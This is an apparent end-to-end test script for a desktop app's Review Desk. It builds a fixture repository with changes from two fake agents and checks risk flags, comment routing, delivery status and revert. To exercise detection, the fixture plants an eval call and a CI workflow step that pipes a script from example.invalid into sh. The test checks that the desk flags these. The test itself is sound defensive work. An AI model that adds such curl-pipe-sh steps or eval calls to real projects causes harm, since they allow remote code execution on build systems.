#!/usr/bin/env node
// Scenario: F21 — the Review Desk (⌘G) on the REAL app, with two fake agents.
//
// A throwaway repository on branch hermes/task carries two "turns" of
// uncommitted work: Agent A changed src/app.js (turn 1), Agent B changed
// src/util.js, package-lock.json and .github/workflows/ci.yml (turn 2).
// Both agents are the fake vendor CLI (tools/fake-agents/fake-cli.mjs)
// started through `hi run` as `claude`, in the same folder; the turn ledger
// (F20) is not filled yet, so the turns are injected through the test
// bridge with exactly the patches git produced.
//
//   run 1  fresh install: the command palette's ⌘G entry is "Toggle Git
//          Panel"; the launchHelper and reviewDesk flags are turned on
//   run 2  relaunch:
//          - the ⌘G menu route opens the Review Desk, the palette entry
//            reads "Review Desk", and no git panel is mounted
//          - by file: four changed files; the lockfile and the workflow
//            carry risk flags, src/app.js carries none
//          - a viewed checkbox survives closing and reopening the desk
//          - by turn: T1 (Agent A) and T2 (Agent B); a comment on a line of
//            turn 2 is routed to Agent B, one on turn 1 to Agent A
//          - Send to Agent A: review-1.md is written, ONE tagged line
//            arrives in A's terminal (the fake records it), A's prompt hook
//            reports it through `hi signal`, and Hermes shows "delivered"
//          - Send to Agent B (a vendor without a prompt hook): the line
//            arrives in B's terminal, nothing comes back, Hermes shows
//            "not delivered" with Retry; Retry pastes the same line again
//          - Send to Agent A while it is on a turn: nothing is typed into
//            it; Hermes shows the send as waiting, and pastes the line only
//            once A's turn ends (its Stop hook), then shows "delivered"
//          - Revert turn 2: the preview lists its three files and applies
//            cleanly; afterwards those files are back at the base and
//            src/app.js still has turn 1's change
//
// Negative control: HERMES_E2E_F21_RISK_FILE=src/app.js (expect a risk flag
// on a plain edit) must end in RESULT: FAIL.
//
// Windows: the fake `claude` has to be on the user's registry Path (see
// N12); that is only changed on a CI runner, so outside CI this scenario
// reports RESULT: SKIP there.
//
//   node e2e/app/build.mjs
//   node e2e/app/scenarios/F21-review-desk.mjs
//
// Evidence (log, screenshots, the fakes' records) goes to
// HERMES_E2E_EVIDENCE, or <out dir>/evidence/F21-review-desk.

import { execFileSync } from "node:child_process";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { platform, tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { REPO_ROOT, createLogger, finishScenario, launchApp, outDir, sleep } from "../harness.mjs";

const SCENARIO = "F21-review-desk";
const startedAt = Date.now();
const evidenceDir = process.env.HERMES_E2E_EVIDENCE || join(outDir(), "evidence", SCENARIO);
const logFile = join(evidenceDir, "scenario.log");
rmSync(logFile, { force: true });
const log = createLogger(logFile);
const onWindows = platform() === "win32";
/** The file that must carry a risk flag. Overridable so the check can be shown to fail. */
const RISK_FILE = process.env.HERMES_E2E_F21_RISK_FILE || "package-lock.json";

function assert(condition, message) {
  if (!condition) throw new Error(`ASSERTION FAILED: ${message}`);
  log(`  ok — ${message}`);
}

// ─── A throwaway repository with two turns of uncommitted work ──────

const work = realpathSync.native(mkdtempSync(join(tmpdir(), "hermes-e2e-f21-")));
const repo = join(work, "f21-repo");
const fakeBin = join(work, "bin");
const recordDir = join(work, "records");
const privateHome = join(work, "home");
for (const d of [repo, fakeBin, recordDir, privateHome]) mkdirSync(d, { recursive: true });
const gitEnv = {
  ...process.env,
  GIT_AUTHOR_NAME: "Hermes Test",
  GIT_AUTHOR_EMAIL: "test@example.com",
  GIT_COMMITTER_NAME: "Hermes Test",
  GIT_COMMITTER_EMAIL: "test@example.com",
  GIT_CONFIG_NOSYSTEM: "1",
};
const git = (...args) => execFileSync("git", ["-C", repo, ...args], { env: gitEnv, encoding: "utf8" });
const write = (rel, text) => {
  mkdirSync(join(repo, rel, ".."), { recursive: true });
  writeFileSync(join(repo, rel), text);
};
const read = (rel) => readFileSync(join(repo, rel), "utf8");

const BASE = {
  "src/app.js": "const a = 1;\nconst b = 2;\nexport default a + b;\n",
  "src/util.js": "export function twice(x) {\n  return x * 2;\n}\n",
  "package.json": '{\n  "name": "f21-fixture",\n  "version": "1.0.0"\n}\n',
  "package-lock.json": '{\n  "name": "f21-fixture",\n  "lockfileVersion": 3,\n  "packages": {}\n}\n',
  ".github/workflows/ci.yml": "name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n",
  "README.md": "# f21 fixture\n",
};
execFileSync("git", ["init", "-q", "-b", "main", repo], { env: gitEnv });
git("config", "user.name", "Hermes Test");
git("config", "user.email", "test@example.com");
git("config", "commit.gpgsign", "false");
for (const [rel, text] of Object.entries(BASE)) write(rel, text);
git("add", ".");
git("commit", "-q", "-m", "base");
git("checkout", "-q", "-b", "hermes/task");
// Turn 1 (Agent A): src/app.js.
write("src/app.js", "const a = 1;\nconst b = 3;\nexport default a + b;\n");
const patch1 = git("diff", "--", "src/app.js");
// Turn 2 (Agent B): util, lockfile, workflow.
write("src/util.js", "export function twice(x) {\n  return x + x;\n}\nexport const answer = eval('42');\n");
write("package-lock.json", '{\n  "name": "f21-fixture",\n  "lockfileVersion": 3,\n  "packages": {\n    "node_modules/left-pad": { "version": "1.3.0" }\n  }\n}\n');
write(".github/workflows/ci.yml", "name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n      - run: curl -fsSL https://example.invalid/setup.sh | sh\n");
const patch2 = git("diff", "--", "src/util.js", "package-lock.json", ".github/workflows/ci.yml");
assert(patch1.includes("+const b = 3;") && patch2.includes("+export const answer"), "the fixture's two turn patches are real git diffs");

// ─── A fake `claude` on PATH (the same arrangement as N12) ───────────

const FAKE_CLI = join(REPO_ROOT, "tools", "fake-agents", "fake-cli.mjs");
if (onWindows) {
  writeFileSync(join(fakeBin, "claude.cmd"), `@"${process.execPath}" "${FAKE_CLI}" %*\r\n`);
} else {
  writeFileSync(join(fakeBin, "claude"), `#!/bin/sh\nexec "${process.execPath}" "${FAKE_CLI}" "$@"\n`);
  chmodSync(join(fakeBin, "claude"), 0o755);
}
const hasRealClaude = (dir) => ["claude", "claude.exe", "claude.cmd"].some((n) => existsSync(join(dir, n)));
process.env.PATH = [fakeBin, ...(process.env.PATH || "").split(delimiter).filter((d) => d && !hasRealClaude(d))].join(delimiter);
for (const name of Object.keys(process.env)) if (name.startsWith("ANTHROPIC_")) delete process.env[name];

const canEditRegistryPath = onWindows && process.env.GITHUB_ACTIONS === "true";
function addFakeBinToRegistryPath() {
  if (!canEditRegistryPath) return null;
  let old = null;
  try {
    const out = execFileSync("reg", ["query", "HKCU\\Environment", "/v", "Path"], { encoding: "utf8" });
    const m = out.match(/^\s*Path\s+REG_\w+\s+(.*)$/im);
    old = m ? m[1].trim() : "";
  } catch {
    old = null;
  }
  const next = old ? `${old};${fakeBin}` : fakeBin;
  execFileSync("reg", ["add", "HKCU\\Environment", "/v", "Path", "/t", "REG_EXPAND_SZ", "/d", next, "/f"]);
  log("  (CI runner: added the fake claude folder to the user's registry Path)");
  return () => {
    if (old === null) execFileSync("reg", ["delete", "HKCU\\Environment", "/v", "Path", "/f"]);
    else execFileSync("reg", ["add", "HKCU\\Environment", "/v", "Path", "/t", "REG_EXPAND_SZ", "/d", old, "/f"]);
    log("  (CI runner: restored the user's registry Path)");
  };
}
if (onWindows && !canEditRegistryPath) {
  log("this scenario needs the fake claude on a Windows terminal's PATH, which means the user's registry Path; that is only changed on a CI runner");
  log("RESULT: SKIP (Windows outside CI)");
  rmSync(work, { recursive: true, force: true });
  process.exit(0);
}
let undoRegistryPath = null;

const setFakeMode = (mode) => {
  writeFileSync(join(recordDir, "mode"), `${mode}\n`);
  log(`  fake vendor mode: ${mode}`);
};
const records = () =>
  readdirSync(recordDir)
    .filter((f) => f.startsWith("launch-"))
    .sort()
    .map((f) => JSON.parse(readFileSync(join(recordDir, f), "utf8")));
/** The fake's record for one Hermes session (it saves after every prompt). */
const recordOf = (sessionId) => records().find((r) => r.env?.HERMES_SESSION_ID === sessionId) ?? null;

function launch(run, { first = false } = {}) {
  const runDir = join(evidenceDir, `run-${run}`);
  const common = { runDir, log, env: { HERMES_FAKE_DIR: recordDir } };
  return onWindows
    ? launchApp({ ...common, home: "real", resetData: first })
    : launchApp({ ...common, home: "private", homeDir: privateHome });
}

// ─── UI steps ────────────────────────────────────────────────────────

async function completeOnboarding(bridge) {
  await bridge.waitFor("the welcome dialog", `return !!e2e.first(".onboarding-dialog");`);
  for (let i = 0; i < 3; i++) {
    await bridge.click(".onboarding-actions .onboarding-btn-primary");
    await sleep(150);
  }
  await bridge.waitFor("the privacy screen", `return e2e.all(".onboarding-privacy-checkbox input").length === 2;`);
  await bridge.clickWhenReady(`
    const [analytics, policy] = e2e.all(".onboarding-privacy-checkbox input");
    if (analytics.checked) e2e.click(analytics);
    if (!policy.checked) e2e.click(policy);
    return true;
  `);
  await bridge.waitFor("the Finish button to become enabled", `
    const b = e2e.first(".onboarding-actions .onboarding-btn-primary");
    return !!b && !b.disabled;
  `);
  await bridge.click(".onboarding-actions .onboarding-btn-primary");
  await bridge.waitFor("the welcome dialog to close", `return !e2e.first(".onboarding-backdrop");`);
  await sleep(300);
  await dismissWhatsNew(bridge);
}
async function dismissWhatsNew(bridge) {
  if (await bridge.exists(".whatsnew-backdrop")) {
    await bridge.click(".whatsnew-footer .whatsnew-btn-primary");
    await bridge.waitFor("the what's-new dialog to close", `return !e2e.first(".whatsnew-backdrop");`);
  }
}
async function waitForReturningLaunch(bridge) {
  await bridge.waitFor("the app UI to be ready (no onboarding this time)", `
    return !!e2e.first(".topbar-title, .topbar") && !e2e.first(".onboarding-backdrop");
  `);
  await dismissWhatsNew(bridge);
}

/** Settings > (7 clicks on the title) > Flags: set one flag's override. */
async function setFlagOverride(bridge, flagId, value) {
  await bridge.clickByName("Settings");
  await bridge.waitFor("the Settings dialog", `return !!e2e.first('[role="dialog"] .settings-title');`);
  await bridge.eval(`
    const title = e2e.must(e2e.first(".settings-title"), "settings title");
    for (let i = 0; i < 7; i++) e2e.click(title);
    return true;
  `);
  await bridge.waitFor("the hidden Flags tab", `return e2e.all(".settings-tab").some((el) => e2e.norm(el.innerText) === "Flags");`);
  await bridge.eval(`
    const tab = e2e.all(".settings-tab").find((el) => e2e.norm(el.innerText) === "Flags");
    return e2e.click(e2e.must(tab, "Flags tab"));
  `);
  const selector = `select.settings-select[data-flag-id="${flagId}"]`;
  await bridge.waitFor(`the ${flagId} flag control`, `return !!e2e.first(${JSON.stringify(selector)});`);
  const result = await bridge.eval(`
    const sel = e2e.must(e2e.first(${JSON.stringify(selector)}), "flag select");
    const setter = Object.getOwnPropertyDescriptor(window.HTMLSelectElement.prototype, "value").set;
    setter.call(sel, ${JSON.stringify(value)});
    sel.dispatchEvent(new Event("change", { bubbles: true }));
    return sel.value;
  `);
  assert(result === value, `flag "${flagId}" set to "${value}"`);
  await bridge.waitFor("the override to be saved", `
    const raw = await window.__TAURI_INTERNALS__.invoke("get_settings");
    const overrides = raw.feature_flag_overrides ? JSON.parse(raw.feature_flag_overrides) : {};
    return overrides[${JSON.stringify(flagId)}] === ${value === "on" ? "true" : "false"};
  `);
  await bridge.click(".settings-close");
  await bridge.waitFor("the Settings dialog to close", `return !e2e.first(".settings-title");`);
}

const setInput = (selector, value) => `
  const el = e2e.must(e2e.first(${JSON.stringify(selector)}), ${JSON.stringify(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
  el.focus();
  setter.call(el, ${JSON.stringify(value)});
  el.dispatchEvent(new Event("input", { bubbles: true }));
  return el.value;
`;
const PRIMARY = ".session-creator-actions .session-creator-btn-primary, .session-creator-footer-actions .session-creator-btn-primary";
async function clickPrimary(bridge, what) {
  const r = await bridge.clickWhenReady(`
    const b = e2e.must(e2e.first(${JSON.stringify(PRIMARY)}), "the wizard's primary button");
    return e2e.click(b);
  `);
  log(`  wizard ${what}: clicked "${r.clicked}"`);
  await sleep(300);
}

/**
 * New Session wizard: a Claude session (the fake, through `hi run`) in the
 * fixture repository, named `label`. The second session on the same branch
 * picks "Use current branch" (the branch is already taken by the first).
 */
async function createAgentSession(bridge, label) {
  const before = await bridge.terminalIds();
  if (await bridge.exists("button.es-tile-primary")) await bridge.click("button.es-tile-primary");
  else await bridge.click(".activity-bar-action");
  await bridge.waitFor("the New Session wizard", `return !!e2e.first(".session-creator");`, { timeoutMs: 20_000 });
  await bridge.waitFor("the agent picker", `return e2e.all(".session-creator-provider-card").length > 0;`, { timeoutMs: 20_000 });
  await bridge.clickWhenReady(`
    const card = e2e.all(".session-creator-provider-card").find((c) => c.innerText.trim().startsWith("Claude"));
    return e2e.click(e2e.must(card, "the Claude card"));
  `);
  await bridge.eval(`
    const box = e2e.first(".session-creator-agent-view input[type=checkbox]");
    if (box && box.checked) e2e.click(box);
    return true;
  `);
  await clickPrimary(bridge, "agent");
  // Folder step: the fixture repo (added by path the first time, then listed).
  await bridge.waitFor("the folder step", `return !!e2e.first(".workspace-scan-input");`, { timeoutMs: 20_000 });
  const listed = await bridge.eval(`
    const row = e2e.all(".project-picker-item").find((el) => el.innerText.includes("f21-repo"));
    if (!row) return false;
    if (!row.classList.contains("project-picker-item-attached")) e2e.click(row);
    return true;
  `);
  if (!listed) {
    await bridge.eval(setInput(".workspace-scan-input", repo));
    await bridge.clickByName("Scan", { within: ".project-picker-footer" });
  }
  await bridge.waitFor("the fixture repo to be selected", `
    return e2e.all(".project-picker-item.project-picker-item-attached").some((el) => el.innerText.includes("f21-repo"));
  `);
  await clickPrimary(bridge, "folder");
  // The wizard may show more steps (branch, permissions, confirm); walk them.
  for (let i = 0; i < 8; i++) {
    if (!(await bridge.exists(".session-creator"))) break;
    if (await bridge.exists(".session-creator-branch-multi")) {
      await sleep(400);
      const chosen = await bridge.eval(`return !!e2e.first(".session-creator-branch-selected-label");`);
      if (!chosen) {
        // The branch is taken by the first session: work in the same checkout.
        if (!(await bridge.exists(".branch-selector-body"))) await bridge.click(".session-creator-branch-project-header");
        // By its visible text: the button's accessible name is its title (a hint).
        await bridge.clickWhenReady(`
          const b = e2e.all(".session-creator-branch-multi button").find((el) => e2e.norm(el.innerText) === "Use current branch");
          return e2e.click(e2e.must(b, "the Use current branch button"));
        `);
        await sleep(300);
        if (await bridge.exists(".session-creator-branch-multi")) await clickPrimary(bridge, "branch");
        continue;
      }
    }
    if (await bridge.exists('input.command-palette-input[placeholder="Session name (optional)"]')) {
      await bridge.eval(setInput('input.command-palette-input[placeholder="Session name (optional)"]', label));
    }
    await clickPrimary(bridge, `step ${i + 1}`);
  }
  await bridge.waitFor("the wizard to close", `return !e2e.first(".session-creator");`, { timeoutMs: 20_000 });
  const id = await bridge.waitFor(`the terminal of "${label}"`, `
    const ids = window.__HERMES_E2E__.terminalIds().filter((id) => !${JSON.stringify(before)}.includes(id));
    return ids.length === 1 ? ids[0] : null;
  `, { timeoutMs: 20_000 });
  await bridge.waitForTerminal(id, /fake-cli: ready/, { timeoutMs: 40_000 });
  const data = (await bridge.eval(`return await window.__TAURI_INTERNALS__.invoke("get_sessions");`)).find((s) => s.id === id);
  assert(!!data && sameFolder(data.working_directory, repo), `"${label}" works in the fixture repository (${data?.working_directory})`);
  return id;
}

const sameFolder = (a, b) => {
  const norm = (p) => {
    try {
      p = realpathSync.native(p);
    } catch {
      /* keep as given */
    }
    return p.replace(/\\/g, "/").replace(/\/+$/, "").toLowerCase();
  };
  return norm(a) === norm(b);
};

async function rawInvoke(bridge, cmd, args = {}) {
  return bridge.eval(`
    try {
      const value = await window.__TAURI_INTERNALS__.invoke(${JSON.stringify(cmd)}, ${JSON.stringify(args)});
      return { ok: true, value };
    } catch (e) {
      return { ok: false, error: String(e && e.message ? e.message : e) };
    }
  `);
}
/** The native menu's action, as the ⌘G accelerator delivers it. */
async function menuAction(bridge, action) {
  const r = await rawInvoke(bridge, "plugin:event|emit", { event: "menu-action", payload: { action } });
  assert(r.ok, `the menu action "${action}" was delivered`);
}
async function paletteLabelForGit(bridge) {
  await menuAction(bridge, "view.command-palette");
  await bridge.waitFor("the command palette", `return !!e2e.first(".command-palette");`);
  const labels = await bridge.eval(`return e2e.all(".command-palette-item .command-palette-label").map((el) => e2e.norm(el.textContent));`);
  await menuAction(bridge, "view.command-palette");
  await bridge.waitFor("the command palette to close", `return !e2e.first(".command-palette");`);
  return labels.find((l) => l === "Review Desk" || l === "Toggle Git Panel") ?? null;
}
/** Make the session named `label` the active one through its sidebar row. */
async function selectSession(bridge, label) {
  await bridge.clickWhenReady(`
    const row = e2e.all(".session-item").find((it) => e2e.norm(it.innerText).includes(${JSON.stringify(label)}));
    return e2e.click(e2e.must(row, "the session row of ${label}"));
  `);
  await bridge.waitFor(`"${label}" to be the active session`, `
    const row = e2e.all(".session-item").find((it) => e2e.norm(it.innerText).includes(${JSON.stringify(label)}));
    return row && row.classList.contains("session-item-active") ? true : null;
  `, { timeoutMs: 5_000 });
}
const deskOpen = (bridge) => bridge.exists(".review-desk");
async function openDesk(bridge, how) {
  if (how === "menu") await menuAction(bridge, "view.git-panel");
  else await bridge.click(".session-item-wrapper-active .session-subview-btn[title='Review Desk']");
  await bridge.waitFor("the Review Desk", `return !!e2e.first(".review-desk");`);
  await bridge.waitFor("the desk to finish loading", `return e2e.first(".review-desk")?.getAttribute("data-loading") === "0";`, { timeoutMs: 20_000 });
}
async function closeDesk(bridge) {
  await bridge.eval(`document.body.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true })); return true;`);
  await bridge.waitFor("the Review Desk to close", `return !e2e.first(".review-desk");`);
}
const pressKey = (bridge, key) => bridge.eval(`document.body.dispatchEvent(new KeyboardEvent("keydown", { key: ${JSON.stringify(key)}, bubbles: true, cancelable: true })); return true;`);
const fileRows = (bridge) => bridge.eval(`return e2e.all(".review-file-row").map((r) => ({ path: r.getAttribute("data-path"), flags: (r.getAttribute("data-flags") || "").split(" ").filter(Boolean), viewed: r.querySelector(".review-viewed input")?.checked ?? null, selected: r.classList.contains("review-row-selected") }));`);
const turnRows = (bridge) => bridge.eval(`return e2e.all(".review-turn-row").map((r) => ({ session: r.getAttribute("data-session"), n: Number(r.getAttribute("data-turn")), agent: e2e.norm(r.querySelector(".review-turn-agent")?.textContent), selected: r.classList.contains("review-row-selected") }));`);
async function commentOn(bridge, path, text) {
  await bridge.clickWhenReady(`
    const line = e2e.all('.review-line.review-line-add[data-path="' + CSS.escape(${JSON.stringify(path)}) + '"]')[0];
    return e2e.click(e2e.must(line, "an added line of ${path}"));
  `);
  await bridge.waitFor("the comment editor", `return !!e2e.first(".review-comment-editor textarea");`);
  await bridge.eval(`
    const ta = e2e.must(e2e.first(".review-comment-editor textarea"), "comment textarea");
    const setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
    setter.call(ta, ${JSON.stringify(text)});
    ta.dispatchEvent(new Event("input", { bubbles: true }));
    return true;
  `);
  await bridge.click(".review-comment-save");
  return bridge.waitFor("the comment to appear", `
    const c = e2e.all(".review-comment").find((el) => e2e.norm(el.querySelector(".review-comment-text")?.textContent) === ${JSON.stringify(text)});
    return c ? { session: c.getAttribute("data-session"), turn: Number(c.getAttribute("data-turn")), route: e2e.norm(c.querySelector(".review-comment-route")?.textContent) } : null;
  `);
}
/** The person's keystrokes into a session's terminal. */
async function typeInto(bridge, sessionId, text) {
  const r = await rawInvoke(bridge, "write_to_session", { sessionId, data: Buffer.from(text, "utf8").toString("base64") });
  assert(r.ok, `typed ${JSON.stringify(text)} into ${sessionId.slice(0, 8)}`);
}
const statusOf = (bridge, sessionId) => bridge.eval(`const s = window.__HERMES_E2E__.sessionEventSnapshot(${JSON.stringify(sessionId)}); return { kind: s.status.kind, confidence: s.status.confidence };`);
async function waitForPrompts(sessionId, count, { timeoutMs = 15_000 } = {}) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const rec = recordOf(sessionId);
    if (rec && (rec.prompts ?? []).length >= count) return rec.prompts;
    if (Date.now() > deadline) throw new Error(`expected ${count} prompt(s) in the fake's record for ${sessionId}, have ${rec ? (rec.prompts ?? []).length : "no record"}`);
    await sleep(200);
  }
}
async function quit(current) {
  const exit = await current.stop();
  log(`  app exited: ${JSON.stringify(exit)}`);
  assert(!exit.forced && exit.code === 0, "the app quit cleanly");
}

// ─── Scenario ────────────────────────────────────────────────────────

let app;
let failed = false;
try {
  log(`scenario: ${SCENARIO}   platform: ${platform()}   repo: ${repo}   risk file: ${RISK_FILE}`);
  undoRegistryPath = addFakeBinToRegistryPath();
  setFakeMode("prompts");

  // ── run 1: fresh install, flags off ───────────────────────────────
  log("run 1: fresh install — the ⌘G palette entry is the old git panel; turn the flags on");
  app = await launch(1, { first: true });
  await completeOnboarding(app.bridge);
  const labelBefore = await paletteLabelForGit(app.bridge);
  assert(labelBefore === "Toggle Git Panel", `with the flag off the palette's ⌘G entry is "${labelBefore}"`);
  assert(!(await deskOpen(app.bridge)), "no Review Desk without the flag");
  await setFlagOverride(app.bridge, "launchHelper", "on");
  await setFlagOverride(app.bridge, "reviewDesk", "on");
  await quit(app);

  // ── run 2: flags on ───────────────────────────────────────────────
  log("run 2: relaunch with the flags on; two fake agents in the fixture repository");
  app = await launch(2);
  const { bridge } = app;
  await waitForReturningLaunch(bridge);
  const labelAfter = await paletteLabelForGit(bridge);
  assert(labelAfter === "Review Desk", `with the flag on the palette's ⌘G entry is "${labelAfter}"`);

  const idA = await createAgentSession(bridge, "Agent A");
  log(`  Agent A: ${idA}`);
  setFakeMode("prompts no-prompt-hooks");
  const idB = await createAgentSession(bridge, "Agent B");
  log(`  Agent B: ${idB}`);
  assert(idA !== idB, "two sessions");
  const recA0 = recordOf(idA);
  const recB0 = recordOf(idB);
  assert(recA0?.mode === "prompts" && recB0?.mode === "prompts no-prompt-hooks", "Agent A reports prompts through its hook; Agent B is a vendor without one");

  log("step 1: inject the two turns (what the ledger will record) and open the desk through the ⌘G menu route");
  const injected = await bridge.eval(`
    const H = window.__HERMES_E2E__;
    const mk = (sid, n, startedAt, files, ins, del) => ({ sessionId: sid, n, ref: "refs/hermes/" + sid + "/turn/" + n, startedAt, endedAt: startedAt + 1000, diffstat: { files, insertions: ins, deletions: del } });
    H.injectTurns(${JSON.stringify(idA)}, [{ turn: mk(${JSON.stringify(idA)}, 1, 1790000000000, 1, 1, 1), patch: ${JSON.stringify(patch1)} }]);
    H.injectTurns(${JSON.stringify(idB)}, [{ turn: mk(${JSON.stringify(idB)}, 2, 1790000010000, 3, 4, 2), patch: ${JSON.stringify(patch2)} }]);
    return true;
  `);
  assert(injected === true, "turns injected: T1 for Agent A, T2 for Agent B");
  await selectSession(bridge, "Agent A");
  await openDesk(bridge, "menu");
  assert(!(await bridge.exists(".session-git-panel")) && !(await bridge.exists(".git-panel")), "no other git panel is mounted");
  const scope = await bridge.eval(`return { repo: e2e.first(".review-desk").getAttribute("data-repo"), head: e2e.norm(e2e.first(".review-scope")?.textContent) };`);
  assert(sameFolder(scope.repo, repo) && /hermes\/task → main/.test(scope.head), `the desk reviews the fixture repository on hermes/task against main ("${scope.head}")`);

  log("step 2: by file — four changed files with risk flags on the lockfile and the workflow");
  const rows = await fileRows(bridge);
  log(`  files: ${JSON.stringify(rows)}`);
  const paths = rows.map((r) => r.path).sort();
  assert(JSON.stringify(paths) === JSON.stringify([".github/workflows/ci.yml", "package-lock.json", "src/app.js", "src/util.js"]), "the by-file list holds exactly the four changed files");
  const riskRow = rows.find((r) => r.path === RISK_FILE);
  assert(riskRow && riskRow.flags.length > 0, `${RISK_FILE} carries a risk flag (${riskRow?.flags.join(", ")})`);
  assert(rows.find((r) => r.path === "package-lock.json")?.flags.includes("lockfile"), "the lockfile change is flagged as a lockfile");
  const wf = rows.find((r) => r.path === ".github/workflows/ci.yml")?.flags ?? [];
  assert(wf.includes("workflow") && wf.includes("curl_pipe_sh"), `the workflow edit is flagged as a workflow and as curl | sh (${wf.join(", ")})`);
  assert(rows.find((r) => r.path === "src/app.js")?.flags.length === 0, "a plain source edit carries no flag");
  const summary = await bridge.eval(`const s = e2e.first(".review-summary"); return { files: Number(s.getAttribute("data-files")), flags: Number(s.getAttribute("data-flags")), viewed: Number(s.getAttribute("data-viewed")) };`);
  assert(summary.files === 4 && summary.flags >= 3 && summary.viewed === 0, `the summary counts 4 files, ${summary.flags} flags, 0 viewed`);
  await bridge.screenshot(join(evidenceDir, "01-by-file-with-flags.png"));

  log("step 3: viewed checkbox — ticked, kept across closing and reopening the desk; j/k move the selection");
  await bridge.click('.review-file-row[data-path="src/app.js"] .review-viewed input');
  await bridge.waitFor("the file to count as viewed", `return e2e.first(".review-summary")?.getAttribute("data-viewed") === "1";`);
  const before = (await fileRows(bridge)).find((r) => r.selected)?.path;
  await pressKey(bridge, "j");
  const after = await bridge.waitFor("the selection to move", `
    const sel = e2e.all(".review-file-row").find((r) => r.classList.contains("review-row-selected"));
    return sel && sel.getAttribute("data-path") !== ${JSON.stringify(before)} ? sel.getAttribute("data-path") : null;
  `);
  assert(after !== before, `j moved the selection from ${before} to ${after}`);
  await closeDesk(bridge);
  await openDesk(bridge, "sidebar");
  assert((await fileRows(bridge)).find((r) => r.path === "src/app.js")?.viewed === true, "src/app.js is still ticked after reopening from the sidebar button");

  log("step 4: by turn — T1 is Agent A's, T2 is Agent B's; comments are routed to the agent that made the turn");
  await bridge.click('.review-group-btn[data-group="turn"]');
  await bridge.waitFor("the turn list", `return e2e.all(".review-turn-row").length === 2;`);
  const turns = await turnRows(bridge);
  log(`  turns: ${JSON.stringify(turns)}`);
  assert(turns[0].n === 1 && turns[0].session === idA && turns[0].agent === "Agent A", "T1 belongs to Agent A");
  assert(turns[1].n === 2 && turns[1].session === idB && turns[1].agent === "Agent B", "T2 belongs to Agent B");
  await bridge.click(`.review-turn-row[data-turn="2"]`);
  await bridge.waitFor("turn 2's files", `return e2e.all(".review-turn-file").length === 3;`);
  const c1 = await commentOn(bridge, "src/util.js", "Please do not use eval here; parse the number instead.");
  assert(c1.session === idB && c1.turn === 2 && /to Agent B/.test(c1.route), `the comment on turn 2's line is routed to Agent B (${c1.route})`);
  await bridge.click(`.review-turn-row[data-turn="1"]`);
  await bridge.waitFor("turn 1's file", `return e2e.all(".review-turn-file").length === 1;`);
  const c2 = await commentOn(bridge, "src/app.js", "Why 3? The spec says 2.");
  assert(c2.session === idA && c2.turn === 1 && /to Agent A/.test(c2.route), `the comment on turn 1's line is routed to Agent A (${c2.route})`);
  await bridge.screenshot(join(evidenceDir, "02-by-turn-with-comments.png"));

  log("step 5: Send to Agent A — one tagged line reaches A's terminal, its prompt hook reports it, Hermes shows delivered");
  await bridge.click(`.review-send[data-session="${idA}"] .review-send-btn`);
  const deliveredA = await bridge.waitFor("delivery to Agent A", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-state") === "delivered");
    return d ? { n: Number(d.getAttribute("data-n")), text: e2e.norm(d.textContent) } : null;
  `, { timeoutMs: 15_000 });
  assert(deliveredA.n === 1, `Hermes shows "${deliveredA.text}"`);
  const promptsA = await waitForPrompts(idA, 1);
  assert(promptsA.length === 1 && promptsA[0].startsWith("[hermes-review #1] "), `Agent A received exactly one line, tagged: "${promptsA[0].slice(0, 60)}…"`);
  const fileA = join(app.dataDir, "reviews", idA, "review-1.md");
  assert(existsSync(fileA), `review-1.md was written for Agent A (${fileA})`);
  const mdA = readFileSync(fileA, "utf8");
  assert(mdA.includes("# Review 1 for Agent A") && mdA.includes("Why 3? The spec says 2.") && mdA.includes("## src/app.js") && !mdA.includes("eval here"), "the review file holds Agent A's comment and not Agent B's");
  assert(promptsA[0].includes(fileA.replace(/\\/g, "/")) || promptsA[0].includes(fileA), "the pasted line names the review file");
  assert((recordOf(idA).hooksRan ?? []).some((h) => h.event === "UserPromptSubmit"), "Agent A ran its prompt hook (hi signal) for the line");
  // Data safety: the helper writes only the marker to the spool, never the prompt text.
  const spoolA = readFileSync(recordOf(idA).env.HERMES_SIGNAL_FILE, "utf8");
  assert(spoolA.includes('"hermes_tags":["hermes-review#1"]'), "the spool line for the prompt carries the marker as hermes_tags");
  assert(!spoolA.includes("Please read the review") && !spoolA.includes('"prompt"'), "no prompt text reaches the on-disk spool");
  assert(((recordOf(idB) ?? {}).prompts ?? []).length === 0, "Agent B's terminal received nothing");
  await bridge.screenshot(join(evidenceDir, "03-delivered-to-agent-a.png"));

  log("step 6: Send to Agent B — the line arrives, no signal comes back, Hermes shows not delivered with Retry");
  await bridge.click(`.review-send[data-session="${idB}"] .review-send-btn`);
  const sendingB = await bridge.waitFor("the send to start", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2");
    return d ? d.getAttribute("data-state") : null;
  `);
  log(`  delivery 2 state right after Send: ${sendingB}`);
  const notDelivered = await bridge.waitFor("not delivered for Agent B", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2" && el.getAttribute("data-state") === "not_delivered");
    return d ? { text: e2e.norm(d.textContent), retry: !!d.querySelector(".review-retry-btn") } : null;
  `, { timeoutMs: 15_000 });
  assert(notDelivered.retry, `Hermes shows "${notDelivered.text}" with a Retry button`);
  const promptsB = await waitForPrompts(idB, 1);
  assert(promptsB[0].startsWith("[hermes-review #2] "), "the line did reach Agent B's terminal (the vendor just never reported it)");
  assert(!(recordOf(idB).hooksRan ?? []).some((h) => h.event === "UserPromptSubmit"), "Agent B ran no prompt hook, so nothing could confirm delivery");
  assert((await waitForPrompts(idA, 1)).length === 1, "Agent A did not get Agent B's line");
  await bridge.screenshot(join(evidenceDir, "04-not-delivered-to-agent-b.png"));
  await bridge.click(".review-retry-btn");
  await bridge.waitFor("the retry to run", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2");
